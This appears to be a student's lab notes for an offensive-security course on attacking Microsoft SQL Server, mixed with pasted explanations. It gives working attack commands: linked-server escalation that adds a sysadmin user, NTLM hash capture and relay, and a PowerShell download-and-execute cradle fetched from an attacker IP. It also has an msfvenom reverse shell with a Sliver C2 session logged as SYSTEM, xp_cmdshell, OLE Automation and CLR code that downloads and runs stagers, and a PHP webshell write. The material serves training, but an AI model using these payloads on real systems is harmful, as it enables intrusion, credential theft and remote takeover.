            object result = command.ExecuteScalar();
            return result != null && (int)result == 1;
        }
    }

    static void EnableRpcOut(SqlConnection connection, string linkedServerName)
    {
        string query = "EXEC sp_serveroption @server = @LinkedServerName, @optname = 'rpc out', @optvalue = 'true'";
        using (SqlCommand command = new SqlCommand(query, connection))
        {
            command.Parameters.AddWithValue("@LinkedServerName", linkedServerName);
            command.ExecuteNonQuery();
        }
    }
}
```

### **Explanation**

1. **Connection String**:
   - The `connectionString` variable is set to connect to your SQL Server instance using Integrated Security. Replace `your_sql_server_instance` with the actual name of your SQL Server instance.

2. **Checking RPC Out Status**:
   - The `IsRpcOutEnabled` method checks if `RPC Out` is enabled for the specified linked server by querying the `sys.servers` system view. It returns `true` if `RPC Out` is enabled and `false` otherwise.

   ```csharp
   static bool IsRpcOutEnabled(SqlConnection connection, string linkedServerName)
   {
       string query = "SELECT rpc_out_enabled FROM sys.servers WHERE name = @LinkedServerName";
       using (SqlCommand command = new SqlCommand(query, connection))
       {
           command.Parameters.AddWithValue("@LinkedServerName", linkedServerName);
           object result = command.ExecuteScalar();
           return result != null && (int)result == 1;
       }
   }
   ```

3. **Enabling RPC Out**:
   - The `EnableRpcOut` method enables `RPC Out` for the linked server by executing the `sp_serveroption` stored procedure with the appropriate parameters.

   ```csharp
   static void EnableRpcOut(SqlConnection connection, string linkedServerName)
   {
       string query = "EXEC sp_serveroption @server = @LinkedServerName, @optname = 'rpc out', @optvalue = 'true'";
       using (SqlCommand command = new SqlCommand(query, connection))
       {
           command.Parameters.AddWithValue("@LinkedServerName", linkedServerName);
           command.ExecuteNonQuery();
       }
   }
   ```

4. **Main Method Workflow**:
   - The main method establishes a connection to the SQL Server.
   - It checks if `RPC Out` is enabled for the specified linked server.
   - If `RPC Out` is not enabled, it enables it and then verifies that it has been enabled successfully.

### **Running the Code**

- **Replace** the placeholders like `your_sql_server_instance` and `LinkedServer1` with your actual server instance name and linked server name.
- **Compile and run** the program. The output will tell you if `RPC Out` was already enabled or if it has been successfully enabled by the script.

### **Considerations**

- **Permissions**: The code requires that the user running it has the necessary permissions to execute `sp_serveroption` and modify linked server settings.
- **Error Handling**: The example code does not include comprehensive error handling. For production use, consider adding `try-catch` blocks and logging to handle potential issues such as connectivity errors or permission issues.
- **Security**: Enabling `RPC Out` can introduce security risks if not properly managed, so ensure that it is only enabled when necessary and with appropriate controls in place.
Abusing linked servers in SQL Server environments is a common technique for privilege escalation. Linked servers allow an instance of SQL Server to execute commands against other SQL Server instances, and they can be configured to pass through the credentials of the original user or to use a fixed set of credentials. If the linked server is configured insecurely, it may allow a lower-privileged user to escalate privileges by executing commands on the linked server with higher privileges.

### Abuse Linked Servers Using PowerShell (PowerUpSQL)

PowerUpSQL includes a set of cmdlets specifically designed for enumerating and exploiting linked servers in SQL Server environments.

#### 1. **Enumerate Linked Servers**
   - List all linked servers configured on a SQL Server instance.
   ```powershell
   Get-SQLServerLink -Instance <SQL_INSTANCE>
   ```

   - Example:
   ```powershell
   Get-SQLServerLink -Instance "ServerName\InstanceName"
   ```

#### 2. **Check for Open Query Execution on Linked Servers**
   - Check if the linked server allows the execution of queries with a higher privilege.
   ```powershell
   Invoke-SQLLinkedCmd -Instance <SQL_INSTANCE> -Query "SELECT SYSTEM_USER;" -LinkedInstance <LINKED_SERVER>
   ```

   - Example:
   ```powershell
   Invoke-SQLLinkedCmd -Instance "ServerName\InstanceName" -Query "SELECT SYSTEM_USER;" -LinkedInstance "LinkedServerName"
   ```

#### 3. **Execute Commands on the Linked Server**
   - Once you've found a linked server that allows open query execution, you can execute arbitrary SQL commands. For instance, you can try to execute a command to add a user with sysadmin privileges.
   ```powershell
   Invoke-SQLLinkedCmd -Instance <SQL_INSTANCE> -Query "EXEC sp_addsrvrolemember 'MyNewUser', 'sysadmin';" -LinkedInstance <LINKED_SERVER>
   ```

   - Example:
   ```powershell
   Invoke-SQLLinkedCmd -Instance "ServerName\InstanceName" -Query "EXEC sp_addsrvrolemember 'eviluser', 'sysadmin';" -LinkedInstance "LinkedServerName"
   ```

### Abusing Linked Servers Using C#

If you want to perform these actions using C#, here’s how you might approach it:

#### 1. **Enumerate Linked Servers Using C#**
   - This C# code connects to a SQL Server instance and lists the linked servers.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=ServerName\\InstanceName;Database=master;User Id=your_username;Password=your_password;";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            string query = "EXEC sp_linkedservers;";

            using (SqlCommand command = new SqlCommand(query, connection))
            {
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine("Linked Server: " + reader[0]);
                    }
                }
            }
        }
    }
}
```

#### 2. **Execute Commands on the Linked Server Using C#**
   - If you identify a vulnerable linked server, you can execute commands on it.

```csharp
using System;
using System.Data.SqlClient;

class Program
{
    static void Main()
    {
        string connectionString = "Server=ServerName\\InstanceName;Database=master;User Id=your_username;Password=your_password;";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            string query = "EXEC ('EXEC sp_addsrvrolemember ''MyNewUser'', ''sysadmin'';') AT LinkedServerName;";

            using (SqlCommand command = new SqlCommand(query, connection))
            {
                command.ExecuteNonQuery();
                Console.WriteLine("Executed query on linked server");
            }
        }
    }
}
```

### Summary of the Steps

1. **Enumerate Linked Servers**: Use PowerUpSQL or custom C# code to list all the linked servers configured on the target SQL Server instance.

2. **Check Privileges**: Use PowerUpSQL to check if you can execute queries on the linked servers with a higher privilege level.

3. **Exploit the Linked Server**: If the linked server allows query execution, use PowerUpSQL or C# code to execute commands that can elevate your privileges, such as adding a new sysadmin user.

### Considerations

- **Linked Server Authentication**: Be aware of how the linked server is configured. It might be set to use the credentials of the connected user or a fixed set of credentials, which could give you elevated privileges.

- **Audit Logs**: These activities are likely to be logged, so ensure that you have appropriate measures in place if you are performing penetration testing.

- **Permissions**: Only accounts with certain privileges on the SQL Server will be able to enumerate linked servers and execute commands. You may need to escalate your privileges beforehand.

By using these techniques, you can potentially escalate your privileges in an environment where linked servers are configured insecurely.


### Exercise Notes:

#### My C# code 


#### 15.1.3.1 Q2
- used MSSQLEnumeration code 
- text file with commands differed from Offsec `EXEC master.sys.xp_dirtree '\\192.168.45.151\test',1,1`
- captured ntlm hash
- cracked using hashcat and john (hashcat was faster)

#### 15.1.4.1

- configure stage listener using `sliver`
- generate msfvenom powershell payload and add to `shellcode-runner.ps1`
```bash
msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.197 LPORT=9999 --format powershell
```
- on kali start `impacket-ntlmxrelay` (*Note:* trying to base64 encode command string kept failing so I resorted to )
```bash
❯ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.188.6 -c "powershell -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197:8000/shellcode-runner.ps1')"
```
- `sliver` received request
```bash
[server] sliver > mtls -l 9001

[*] Starting mTLS listener ...

[*] Successfully started job #1

[server] sliver > profiles new --mtls 192.168.45.197:9001 -l -f shellcode osep_shellcode

[*] Saved new implant profile osep_shellcode

[server] sliver > stage-listener -u tcp://192.168.45.197:9999 -p osep_shellcode

[*] No builds found for profile osep_shellcode, generating a new one
[*] Sliver name for profile osep_shellcode: ILLEGAL_COINSURANCE
[*] Job 2 (tcp) started

[server] sliver > jobs

 ID   Name   Protocol   Port   Stage Profile
==== ====== ========== ====== ===================================================
 1    mtls   tcp        9001
 2    TCP    tcp        9999   osep_shellcode (Sliver name: ILLEGAL_COINSURANCE)

[*] Session aebd0480 ILLEGAL_COINSURANCE - 192.168.188.6:50042 (appsrv01) - windows/amd64 - Sat, 31 Aug 2024 17:00:29 EDT

[server] sliver > whoami

[!] Please select a session or beacon via `use`

[server] sliver > use aebd0480-bd90-4332-b72b-02ccf05e259a

[*] Active session ILLEGAL_COINSURANCE (aebd0480-bd90-4332-b72b-02ccf05e259a)

[server] sliver (ILLEGAL_COINSURANCE) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM
[server] sliver (ILLEGAL_COINSURANCE) > ifconfig

+-------------------------------------------+
| Ethernet0                                 |
+-------------------------------------------+
|  # | IP Addresses     | MAC Address       |
+----+------------------+-------------------+
| 12 | 192.168.188.6/24 | 00:50:56:bf:06:c4 |
+-------------------------------------------+
1 adapters not shown.

[server] sliver (ILLEGAL_COINSURANCE) > info

        Session ID: aebd0480-bd90-4332-b72b-02ccf05e259a
              Name: ILLEGAL_COINSURANCE
          Hostname: appsrv01
              UUID: 668e3f42-0574-3803-1ee9-065e22661fb8
          Username: NT AUTHORITY\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-18
               PID: 3412
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: mtls://192.168.45.197:9001
    Remote Address: 192.168.188.6:50042
         Proxy URL:
Reconnect Interval: 1m0s
     First Contact: Sat Aug 31 17:00:29 EDT 2024 (6m10s ago)
      Last Checkin: Sat Aug 31 17:06:20 EDT 2024 (19s ago)

```


#### 15.2 Queries

* xp_cmdshell execution impersonating SA
```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell whoami;

```

- write a file
```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';
```

- upload and execute (sliver stager)
```sql
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://192.168.45.197:8000/http.exe -Outfile c:\windows\tasks\http.exe"'
EXEC xp_cmdshell 'c:\windows\tasks\http.exe'
```

- alt method (Ole Automation is failing for me)
- used `impacket-mssqlclient`
```sql
EXECUTE AS LOGIN = 'sa';
USE msdb;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
Declare @myshell int; exec sp_oacreate 'wscript.shell', @myshell output; exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile C:\Windows\Tasks\tcp.exe; Start-Process -FilePath C:\Windows\Tasks\tcp.exe"';

```

*Note:* maybe try `$"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{Config.command}';"`.I'd need to rewrite my code or create a one off.
- This commands.txt worked to download tcp.exe
```sql
username
password
dc01.corp1.com
master
EXECUTE AS LOGIN = 'sa'
USE msdb
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
Declare @myshell int
exec sp_oacreate 'wscript.shell', @myshell output
exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command Invoke-WebRequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile C:\\Windows\\Tasks\\tcp.exe'
```

- This commands.txt worked to run tcp.exe
```sql
username
password
dc01.corp1.com
master
EXECUTE AS LOGIN = 'sa'
USE msdb
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
Declare @myshell int
exec sp_oacreate 'wscript.shell', @myshell output
exec sp_oamethod @myshell, 'run', null ,'powershell.exe -Command Start-Process -FilePath C:\\Windows\\Tasks\\tcp.exe'
```


- From Hacktricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```sql
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```


Yes, there are other methods in SQL Server that can be used to execute external commands or interact with the operating system, similar to `OLE Automation Procedures`. Below are some alternative methods:

### 1. **`xp_cmdshell`**

- **Description**: `xp_cmdshell` is a built-in extended stored procedure that allows you to execute arbitrary commands directly in the operating system's command shell. It's powerful but poses significant security risks if not properly controlled.

- **Usage Example**:
  ```sql
  EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://example.com/file.exe -OutFile C:\Tools\file.exe; Start-Process C:\Tools\file.exe"';
  ```

- **Enabling `xp_cmdshell`**:
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  ```

- **Security Considerations**: Like `OLE Automation Procedures`, `xp_cmdshell` can be dangerous if misused. It’s often disabled by default in production environments.

### 2. **SQL Server Agent Jobs**

- **Description**: SQL Server Agent can be used to schedule and execute jobs, including those that run operating system commands or PowerShell scripts. Jobs are typically used for scheduled tasks but can also be triggered manually.

- **Usage Example**:
  - Create a job that runs a PowerShell script to download and execute a file:
    ```sql
    USE msdb;
    EXEC sp_add_job @job_name = 'DownloadAndRun';
    EXEC sp_add_jobstep @job_name = 'DownloadAndRun', @step_name = 'Step1',
        @subsystem = 'PowerShell',
        @command = 'Invoke-WebRequest -Uri http://example.com/file.exe -OutFile C:\Tools\file.exe; Start-Process C:\Tools\file.exe',
        @on_success_action = 1;
    EXEC sp_add_jobserver @job_name = 'DownloadAndRun';
    EXEC sp_start_job @job_name = 'DownloadAndRun';
    ```

- **Security Considerations**: Jobs are run by the SQL Server Agent service account, so proper permissions and security measures must be in place.

### 3. **CLR Integration (Common Language Runtime)**

- **Description**: SQL Server supports CLR integration, allowing you to write .NET code that can be executed from within SQL Server. This can be used to execute external commands, interact with files, or perform complex operations.

- **Usage Example**:
  - Create a CLR stored procedure to run external commands:
    ```csharp
    using System;
    using System.Data.SqlTypes;
    using System.IO;
    using System.Net;

    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void DownloadAndRunFile(SqlString url, SqlString filePath)
        {
            WebClient client = new WebClient();
            client.DownloadFile(url.Value, filePath.Value);
            System.Diagnostics.Process.Start(filePath.Value);
        }
    }
    ```

  - Deploy the assembly to SQL Server and use it:
    ```sql
    CREATE ASSEMBLY MyCLRAssembly FROM 'C:\Path\To\Your\Assembly.dll' WITH PERMISSION_SET = UNSAFE;
    CREATE PROCEDURE DownloadAndRunFile
    @url NVARCHAR(4000),
    @filePath NVARCHAR(4000)
    AS EXTERNAL NAME MyCLRAssembly.StoredProcedures.DownloadAndRunFile;
    GO

    EXEC DownloadAndRunFile 'http://example.com/file.exe', 'C:\Tools\file.exe';
    ```

- **Security Considerations**: CLR code can execute with high privileges, so it should be used with caution. Ensure that only trusted assemblies are loaded and that the SQL Server instance is properly configured to use CLR.

### 4. **SQL Server Extended Stored Procedures**

- **Description**: Extended stored procedures (like `xp_cmdshell`) allow you to call external programs or scripts directly from SQL Server. However, creating custom extended stored procedures is more complex and involves writing C/C++ code.

- **Usage Example**:
  - You could write an extended stored procedure that calls a shell command, but this requires creating a DLL in C/C++ and registering it with SQL Server.

- **Security Considerations**: Extended stored procedures run in the same address space as SQL Server, so they can affect the stability of the server. They should be used sparingly and with great care.

### **Summary of Methods**

- **`xp_cmdshell`**: Simple and direct but risky; use for basic shell command execution.
- **SQL Server Agent Jobs**: Good for scheduled tasks or more controlled environments.
- **CLR Integration**: Powerful and flexible, allows for complex operations in managed code.
- **Extended Stored Procedures**: Low-level and powerful but complex and potentially dangerous.

### **Conclusion**

These alternatives offer varying levels of power and complexity, with corresponding security implications. `xp_cmdshell` and SQL Server Agent Jobs are the most straightforward, while CLR Integration offers more control and flexibility. Each method should be carefully considered based on the specific needs and security requirements of your environment.

Yes, it is possible to use SQL Server Agent Jobs to stack multiple commands within a single job step. SQL Server Agent Jobs are versatile and allow you to execute a sequence of commands, including T-SQL, operating system commands, PowerShell scripts, or any combination of these.

### **Supported SQL Server Versions**

SQL Server Agent Jobs are supported in all editions of SQL Server that include the SQL Server Agent service. This includes:

- **SQL Server 2005** and later versions
- **SQL Server Express** does not include SQL Server Agent, so jobs cannot be used in this edition.
- **SQL Server Standard, Enterprise, and Developer editions** include SQL Server Agent and support the creation and execution of jobs.

### **Stacking Commands in SQL Server Agent Jobs**

When creating a SQL Server Agent Job, you can stack multiple commands by adding them sequentially in a single job step. You can use:

1. **T-SQL Commands**
2. **Operating System (CmdExec) Commands**
3. **PowerShell Scripts**

### **Example: Stacking Commands in a SQL Server Agent Job**

Let's create a job that performs the following actions in sequence:

1. Runs a T-SQL command.
2. Executes a PowerShell script to download a file.
3. Executes the downloaded file using a system command.

#### **Step-by-Step Example**

1. **Create the SQL Server Agent Job**:
   - You can create and manage jobs using SQL Server Management Studio (SSMS) or via T-SQL.

   ```sql
   USE msdb;
   GO

   -- Create a new job
   EXEC sp_add_job 
       @job_name = N'StackedCommandsJob', 
       @enabled = 1, 
       @description = N'Job to execute stacked commands', 
       @notify_level_eventlog = 2;
   ```

2. **Add a T-SQL Step**:
   - First, add a T-SQL step that performs some SQL operation.

   ```sql
   -- Add a T-SQL step to the job
   EXEC sp_add_jobstep 
       @job_name = N'StackedCommandsJob', 
       @step_name = N'T-SQL Step', 
       @subsystem = N'TSQL', 
       @command = N'SELECT GETDATE();', 
       @retry_attempts = 0, 
       @retry_interval = 0;
   ```

3. **Add a PowerShell Step**:
   - Next, add a PowerShell step that downloads a file from the web.

   ```sql
   -- Add a PowerShell step to the job
   EXEC sp_add_jobstep 
       @job_name = N'StackedCommandsJob', 
       @step_name = N'PowerShell Step', 
       @subsystem = N'PowerShell', 
       @command = N'Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "C:\Tools\file.exe"', 
       @retry_attempts = 0, 
       @retry_interval = 0;
   ```

4. **Add a CmdExec Step**:
   - Finally, add a CmdExec step that runs the downloaded file.

   ```sql
   -- Add a CmdExec step to the job
   EXEC sp_add_jobstep 
       @job_name = N'StackedCommandsJob', 
       @step_name = N'CmdExec Step', 
       @subsystem = N'CMDEXEC', 
       @command = N'C:\Tools\file.exe', 
       @retry_attempts = 0, 
       @retry_interval = 0;
   ```

5. **Schedule the Job**:
   - You can schedule the job to run automatically or start it manually.

   ```sql
   -- Schedule the job to run daily at midnight
   EXEC sp_add_jobschedule 
       @job_name = N'StackedCommandsJob', 
       @name = N'DailySchedule', 
       @freq_type = 4, 
       @freq_interval = 1, 
       @active_start_time = 000000;
   ```

6. **Start the Job Manually**:
   - If you want to start the job immediately, you can execute the following:

   ```sql
   -- Start the job manually
   EXEC sp_start_job @job_name = N'StackedCommandsJob';
   ```

### **Considerations and Best Practices**

- **Error Handling**: Ensure that each step is properly configured to handle errors. SQL Server Agent can be configured to stop the job if a step fails or to proceed to the next step.

- **Permissions**: Ensure that the SQL Server Agent service account has the necessary permissions to execute the commands, particularly for operating system commands and PowerShell scripts.

- **Security**: Always be cautious when executing external commands or scripts, especially if they involve downloading and executing files. Properly secure the environment to prevent unauthorized access.

- **Monitoring**: Regularly monitor and review the job history to ensure that the jobs are running as expected. SQL Server Agent provides detailed logging for job executions.

The error message you're encountering indicates that the SQL Server Agent service is not running on your SQL Server instance. The SQL Server Agent is a crucial service for running scheduled jobs, alerts, and other automation tasks in SQL Server.

### **Steps to Resolve the Issue**

To resolve this issue, you'll need to start the SQL Server Agent service. Here's how you can do it:

#### **1. Start SQL Server Agent via SQL Server Management Studio (SSMS)**

1. **Open SSMS**:
   - Connect to your SQL Server instance.

2. **Locate SQL Server Agent**:
   - In the Object Explorer, expand the "SQL Server Agent" node.

3. **Start SQL Server Agent**:
   - Right-click on "SQL Server Agent" and select "Start".
   - Confirm that the service starts successfully.

#### **2. Start SQL Server Agent via SQL Server Configuration Manager**

1. **Open SQL Server Configuration Manager**:
   - Depending on your version of SQL Server, search for "SQL Server Configuration Manager" in the Start menu.

2. **Locate SQL Server Agent**:
   - In the left pane, select "SQL Server Services".
   - In the right pane, find the "SQL Server Agent" service associated with your SQL Server instance.

3. **Start the Service**:
   - Right-click on the "SQL Server Agent" service and select "Start".
   - Ensure the service starts successfully.

#### **3. Start SQL Server Agent via Command Prompt**

If you prefer to start the service via the command line, you can use the `net start` command:

1. **Open Command Prompt**:
   - Open Command Prompt with administrative privileges.

2. **Start SQL Server Agent**:
   - Run the following command:
     ```cmd
     net start SQLServerAgent
     ```
   - If you're using a named instance of SQL Server, the command will look like this:
     ```cmd
     net start SQLAgent$InstanceName
     ```
   - Replace `InstanceName` with the name of your SQL Server instance.

#### **4. Verify the Service is Running**

After starting the service, you can verify it's running:

1. **In SSMS**:
   - The SQL Server Agent node should now display a green arrow indicating that it is running.

2. **Using Command Line**:
   - Run the following command to check the status:
     ```cmd
     sc query SQLServerAgent
     ```
   - For a named instance:
     ```cmd
     sc query SQLAgent$InstanceName
     ```

### **Retry the Job Script**

Once the SQL Server Agent service is running, you can retry running your job script. The job should now be successfully added, scheduled, and started without encountering the error.

### **Automate SQL Server Agent Start (Optional)**

If you want to ensure that SQL Server Agent starts automatically whenever the SQL Server service is started:

1. **Open SQL Server Configuration Manager**.
2. **Set SQL Server Agent Service to Start Automatically**:
   - Right-click on the "SQL Server Agent" service.
   - Go to "Properties" and set the "Start Mode" to "Automatic".
   - This ensures that SQL Server Agent starts whenever the SQL Server instance is started.

With SQL Server Agent running, your jobs will be executed according to their schedules or when manually triggered.


When using `sp_OACreate` in SQL Server, you can leverage various COM objects to execute commands, interact with the file system, manipulate files, run scripts, and more. The `sp_OACreate` stored procedure is used to create instances of OLE Automation COM objects, and you can then use these objects to invoke methods, access properties, and perform tasks directly from SQL Server.

### **Common COM Objects and Their Uses with `sp_OACreate`**

Here are some common COM objects that you can create with `sp_OACreate` for running commands or performing various tasks:

1. **`WScript.Shell`**
   - **Purpose**: Provides methods to run programs, execute command-line commands, and interact with environment variables.
   - **Common Methods**:
     - `Run`: Runs a command or executable.
     - `Exec`: Executes a command and returns an object representing the process.
   - **Example**:
```sql
     DECLARE @myshell INT;
     DECLARE @hr INT;
     EXEC @hr = sp_OACreate 'WScript.Shell', @myshell OUT;
     EXEC @hr = sp_OAMethod @myshell, 'Run', NULL, 'cmd /c dir C:\', 0, TRUE;
     EXEC sp_OADestroy @myshell;
```

2. **`Scripting.FileSystemObject`**
   - **Purpose**: Provides access to the file system, allowing you to create, read, write, and delete files and directories.
   - **Common Methods**:
     - `CreateTextFile`: Creates a new text file.
     - `OpenTextFile`: Opens an existing text file for reading or writing.
     - `DeleteFile`: Deletes a file.
   - **Example**:
     ```sql
     DECLARE @fso INT;
     DECLARE @file INT;
     EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUT;
     EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUT, 'C:\Temp\testfile.txt', TRUE;
     EXEC sp_OAMethod @file, 'WriteLine', NULL, 'This is a test.';
     EXEC sp_OADestroy @file;
     EXEC sp_OADestroy @fso;
     ```

3. **`MSXML2.ServerXMLHTTP`**
   - **Purpose**: Used to send HTTP requests and receive responses from web servers, allowing SQL Server to interact with web services or download content.
   - **Common Methods**:
     - `Open`: Initializes a new HTTP request.
     - `Send`: Sends the HTTP request.
     - `ResponseText`: Retrieves the response body as text.
   - **Example**:
     ```sql
     DECLARE @http INT;
     DECLARE @hr INT;
     DECLARE @response NVARCHAR(MAX);
     EXEC @hr = sp_OACreate 'MSXML2.ServerXMLHTTP', @http OUT;
     EXEC @hr = sp_OAMethod @http, 'Open', NULL, 'GET', 'http://www.example.com', FALSE;
     EXEC @hr = sp_OAMethod @http, 'Send';
     EXEC @hr = sp_OAGetProperty @http, 'responseText', @response OUT;
     PRINT @response;
     EXEC sp_OADestroy @http;
     ```

4. **`Excel.Application`**
   - **Purpose**: Automates Microsoft Excel, allowing SQL Server to create, modify, and interact with Excel workbooks.
   - **Common Methods**:
     - `Workbooks.Open`: Opens an existing workbook.
     - `Workbooks.Add`: Creates a new workbook.
     - `ActiveWorkbook.SaveAs`: Saves the active workbook.
     - `Quit`: Quits the Excel application.
   - **Example**:
     ```sql
     DECLARE @excel INT;
     DECLARE @workbook INT;
     EXEC sp_OACreate 'Excel.Application', @excel OUT;
     EXEC sp_OAMethod @excel, 'Workbooks.Add', @workbook OUT;
     EXEC sp_OAMethod @workbook, 'SaveAs', NULL, 'C:\Temp\myworkbook.xlsx';
     EXEC sp_OAMethod @excel, 'Quit';
     EXEC sp_OADestroy @excel;
     ```

5. **`WScript.Network`**
   - **Purpose**: Provides access to network resources, such as mapping network drives or interacting with printers.
   - **Common Methods**:
     - `MapNetworkDrive`: Maps a network drive.
     - `RemoveNetworkDrive`: Removes a mapped network drive.
   - **Example**:
     ```sql
     DECLARE @network INT;
     EXEC sp_OACreate 'WScript.Network', @network OUT;
     EXEC sp_OAMethod @network, 'MapNetworkDrive', NULL, 'Z:', '\\Server\Share';
     EXEC sp_OADestroy @network;
     ```

### **General Workflow for Using `sp_OACreate`**

1. **Create the COM Object**:
   - Use `sp_OACreate` to create an instance of the desired COM object.

2. **Use Methods or Access Properties**:
   - Use `sp_OAMethod` to call methods on the COM object, or `sp_OAGetProperty` and `sp_OASetProperty` to get or set properties.

3. **Handle Return Values**:
   - Capture the return values or output from methods and handle them as needed.

4. **Clean Up**:
   - Always use `sp_OADestroy` to release the COM object and free up resources.

### **Error Handling**

You can also include error handling to manage issues that may arise during the execution of commands. This often involves checking the return value from `sp_OACreate` and `sp_OAMethod` to ensure the command executed successfully.

### **Security Considerations**

- **Permissions**: Ensure that the SQL Server service account has the necessary permissions to execute these commands, particularly when interacting with the file system or network resources.
- **Security Risks**: Running commands through OLE Automation can introduce significant security risks, especially if the SQL Server instance is exposed to untrusted users or inputs. Always validate and sanitize inputs and use these capabilities cautiously.

### **Conclusion**

`sp_OACreate` provides powerful capabilities for executing commands and interacting with external systems from within SQL Server. By leveraging various COM objects, you can automate tasks, manipulate files, access network resources, and more. However, it is essential to use these features carefully, considering the security implications and ensuring that proper error handling is in place.

You can determine if your SQL Server instance supports **CLR Integration** by checking the configuration setting `clr enabled`. This setting indicates whether Common Language Runtime (CLR) integration is enabled in SQL Server.

Here’s how you can check if CLR integration is supported and enabled on your SQL Server instance:

### **1. Check if CLR Integration is Enabled**

You can use the following T-SQL command to check the status of the `clr enabled` configuration option:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled';
```

### **Explanation**

- **sp_configure 'show advanced options', 1;**: This command enables advanced options so that you can see and modify settings like `clr enabled`.
  
- **sp_configure 'clr enabled';**: This retrieves the current setting for CLR integration. The result will show the following columns:
  - **name**: The name of the configuration option (`clr enabled`).
  - **minimum**: The minimum value for the setting (usually 0).
  - **maximum**: The maximum value for the setting (usually 1).
  - **config_value**: The current configuration value (1 means enabled, 0 means disabled).
  - **run_value**: The currently active value (1 means enabled, 0 means disabled).

### **Example Output Interpretation**

If you run the above script, you might get an output like this:

| name         | minimum | maximum | config_value | run_value |
|--------------|---------|---------|--------------|-----------|
| clr enabled  | 0       | 1       | 1            | 1         |

- **config_value**: Indicates whether CLR integration is configured to be enabled (1) or disabled (0).
- **run_value**: Indicates whether CLR integration is currently enabled (1) or disabled (0) in the running SQL Server instance.

### **2. Enable CLR Integration (if necessary)**

If `clr enabled` is set to `0`, you can enable CLR integration by running the following commands:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
```

### **3. Verify CLR Integration**

After enabling CLR, you can verify it by running the `sp_configure 'clr enabled'` command again to check that the `config_value` and `run_value` are both set to `1`.

### **4. Check SQL Server Version and Edition**

SQL Server CLR integration is supported in the following editions:

- **SQL Server Standard**
- **SQL Server Enterprise**
- **SQL Server Developer**
- **SQL Server Express** (CLR integration is supported, but some features may be limited compared to the higher editions)

To check the version and edition of your SQL Server, you can run:

```sql
SELECT SERVERPROPERTY('ProductVersion') AS Version,
       SERVERPROPERTY('ProductLevel') AS ProductLevel,
       SERVERPROPERTY('Edition') AS Edition;
```

### **Conclusion**

By running the provided T-SQL commands, you can easily determine whether CLR integration is supported and enabled on your SQL Server instance. If it’s disabled, you can enable it using the provided steps.

To download a file from a URL and execute it using SQL Server's CLR integration, you can create a CLR stored procedure in C#. This stored procedure will perform the following steps:

1. Download the file from the specified URL.
2. Save the file to a temporary location on the SQL Server machine.
3. Execute the downloaded file.

### **Step-by-Step Guide**

#### **1. Enable CLR Integration (if not already enabled)**

First, ensure that CLR integration is enabled on your SQL Server instance:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
EXEC sp_configure 'clr strict security', 0
RECONFIGURE;
```

#### **2. Create a C# CLR Stored Procedure**

You will need to write a C# class that contains the logic for downloading the file and executing it.

Here’s a simple example in C#:

```csharp
using System;
using System.Data.SqlTypes;
using System.Net;
using System.Diagnostics;
using Microsoft.SqlServer.Server;
using System.IO;

public class FileDownloader
{
    [SqlProcedure]
    public static void DownloadAndRun(SqlString url, SqlString filePath)
    {
        try
        {
            // Download the file
            WebClient client = new WebClient();
            client.DownloadFile(url.ToString(), filePath.ToString());

            // Execute the downloaded file
            Process process = new Process();
            process.StartInfo.FileName = filePath.ToString();
            process.StartInfo.UseShellExecute = false;
